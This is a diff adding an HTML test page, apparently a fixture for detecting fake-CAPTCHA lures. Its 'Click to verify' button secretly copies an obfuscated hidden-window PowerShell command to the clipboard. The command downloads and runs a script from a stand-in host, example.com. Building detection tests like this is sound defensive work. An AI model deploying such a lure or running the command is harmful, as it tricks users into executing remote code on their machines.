@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Malicious Page</title>
+</head>
+<body>
+    <h1>Test Page</h1>
+    <div id="captcha">
+        <p>I am not a robot verification</p>
+        <button onclick="copyCommand()">Click to verify</button>
+    </div>
+
+    <script>
+        function copyCommand() {
+            const command = "powershell.exe -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAHAAcwAxACcAKQA=";
+            navigator.clipboard.writeText(command);
+            alert("Verification complete!");
+        }
+    </script>
+</body>
+</html>
